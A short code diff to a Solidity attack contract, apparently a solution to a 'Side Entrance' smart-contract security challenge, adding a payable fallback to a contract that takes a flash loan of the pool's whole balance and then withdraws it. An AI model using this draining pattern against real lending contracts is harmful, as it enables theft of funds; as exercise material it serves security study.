@@ -46,6 +46,8 @@ contract AttackSideEntrance {
         pool = SideEntranceLenderPool(_pool);
     }
 
+    fallback() external payable {}
+
     function attack() external {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
